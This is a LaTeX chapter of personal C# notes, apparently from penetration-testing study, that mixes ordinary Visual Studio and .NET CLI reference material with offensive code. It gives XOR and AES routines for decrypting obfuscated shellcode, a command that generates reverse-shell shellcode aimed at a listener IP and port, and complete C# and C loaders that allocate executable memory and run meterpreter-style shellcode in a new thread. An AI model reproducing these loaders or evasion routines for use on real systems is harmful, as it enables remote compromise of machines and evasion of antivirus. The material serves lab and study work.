\chapter{c\#}

\section{visual studio}
\url{https://github.com/berkanuslu/choco-development-enviroment-setup/blob/main/setup_development_environment.ps1}
Resharper: to format lines at 80
\verb+Extensions >> ReSharper >> Options>>Code Editing >> Languages/C# >> Line Breaks and Wrapping+

Right-click anywhere in the text editor or right-click the selection and choose Cleanup Code in the context menu.

\section{assemblies}
In \verb+C:\Windows\Microsoft.NET\assembly\GAC_MSIL\+
\begin{itemize}
    \item \href{https://learn.microsoft.com/en-us/dotnet/api/system.configuration.install?view=netframework-4.8.1}{System.Configuration.Install}: 
    \item \href{https://learn.microsoft.com/en-us/dotnet/api/system.management.automation?view=powershellsdk-7.4.0}{System.Management.Automation Namespace}: Powershell Class\ldots. 

\end{itemize}

\section{Obfuscation}
\subsection{xor}

\href{https://cyberchef.org/}{Cyberchef}
\begin{itemize}
    \item From Hex (Delimiter: 0x with comma)
    \item XOR (5c HEX, scheme: Standard)
    \item To Hex (Delimiter: 0x with comma, Byes per line: 0)
\end{itemize}

\begin{verbatim}
byte[] buf = new byte[] { <SNIP> }

// Decrypt shellcode
int i = 0;
while (i < buf.Length)
{
    buf[i] = (byte)(buf[i] ^ 0x5c);
    i++;
}
\end{verbatim}

\subsection{AES Encryption}

\begin{verbatim}
        public static byte [] Uncrypt(string be)
        {
            var aes = Aes.Create();
            var key = new byte[16]
            {
                0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b, 0x25, 0x1d,
                0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97
            };
            var iv = new byte[16]
            {
                0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86, 0xd8, 0xe4,
                0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2
            };
            var d = aes.CreateDecryptor(key, iv);
            byte[] b;
            using (var msd = new MemoryStream(Convert.FromBase64String(be)))
            {
                using (var cs = new CryptoStream(msd, d, CryptoStreamMode.Read))
                {
                    using (var ms = new MemoryStream())
                    {
                        cs.CopyTo(ms);
                        b = ms.ToArray();
                    }
                }
            }

            return b;
        }
\end{verbatim}


\section{ShellCode loader}

\begin{verbatim}
python micr0\ shell.py --ip 10.10.16.2 -p 4444 --language csharp
\end{verbatim}


\begin{verbatim}
    internal class Program
    {
        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(uint lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr param,
            uint dwCreationFlags, ref uint lpThreadId);

        [DllImport("kernel32")]
        private static extern uint WaitForSingleObject(IntPtr hHandle,
            uint dwMilliseconds);

        private static void Main(string[] args)
        {
            // Shellcode (msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... 
            //LPORT=... -f csharp)
            byte[] buf = {< SNIP > };

            // Allocate RW space for shellcode
            var lpStartAddress =
                VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x1000, 0x04);

            // Copy shellcode into allocated space
            Marshal.Copy(buf, 0, lpStartAddress, buf.Length);

            // Make shellcode in memory executable
            uint lpflOldProtect;
            VirtualProtect(lpStartAddress, (uint)buf.Length, 0x20,
                out lpflOldProtect);

            // Execute the shellcode in a new thread
            uint lpThreadId = 0;
            var hThread = CreateThread(0, 0, lpStartAddress, IntPtr.Zero, 0,
                ref lpThreadId);

            // Wait until the shellcode is done executing
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
\end{verbatim}


Note in \verb+c+:
\begin{verbatim}
#include "windows.h"
#include "stdlib.h"

unsigned char shellcode[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0......};  // SHELLCODE HERE

int main()
{
    int length = sizeof(shellcode);
    void* exec = VirtualAlloc(0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(exec, shellcode, length);
    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
}
\end{verbatim}




\section{.Net CLI}
\begin{itemize}
    \item otnet new: Creates a new .NET project. You can specify the type of project (console, classlib, webapi, mvc, etc.). For example, dotnet new console will create a new console application.
    \item dotnet build: Builds a .NET project and all of its dependencies. The -c or --configuration option can be used to specify the build configuration (Debug or Release).
    \item dotnet run: Builds and runs the .NET project. It is typically used during the development process to run the application for testing or debugging purposes.
    \item dotnet test: Runs unit tests in a .NET project using a test framework such as MSTest, NUnit, or xUnit.
    \item dotnet publish: Packs the application and its dependencies into a folder for deployment to a hosting system. The -r or --runtime option can be used to specify the target runtime.
    \item dotnet add package: Adds a NuGet package reference to the project file. You specify the package by name. For example, dotnet add package Newtonsoft.Json.
    \item dotnet remove package: Removes a NuGet package reference from the project file. Similar to the add package command, you specify the package to remove by name.
    \item dotnet restore: Restores the dependencies and tools of a project. This command is implicitly run when you run dotnet new, dotnet build, dotnet run, dotnet test, dotnet publish, and dotnet pack.
    \item dotnet clean: Cleans the output of a project. This command is typically used before you build the project again, as it deletes all the previously compiled files, ensuring that you start from a clean state.
    \item dotnet --info: Displays detailed information about the installed .NET environment, including installed versions and all runtime environments.
\end{itemize}

\begin{verbatim}
dotnet new console
dotnet build
dotnet run
\end{verbatim}



\begin{verbatim}
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net7.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>
  <ItemGroup>
    <!-- references look like this -->
    <Reference Include="Library-Question.dll" />
  </ItemGroup>
</Project>
\end{verbatim}

\begin{verbatim}
<ItemGroup>
  <ProjectReference Include="app.csproj" />
  <ProjectReference Include="..\lib2\lib2.csproj" />
  <ProjectReference Include="..\lib1\lib1.csproj" />
</ItemGroup>

<ItemGroup>
  <Reference Include="MyAssembly">
    <HintPath>".\MyDLLFolder\MyAssembly.dll</HintPath>
  </Reference>
</ItemGroup>
\end{verbatim}


\begin{verbatim}
using HTBLibrary;
using System;

class Program
{
    static void Main(string[] args)
    {
        Console.WriteLine(Flag.GetFlag());
    }
}

\end{verbatim}

\section{mono}

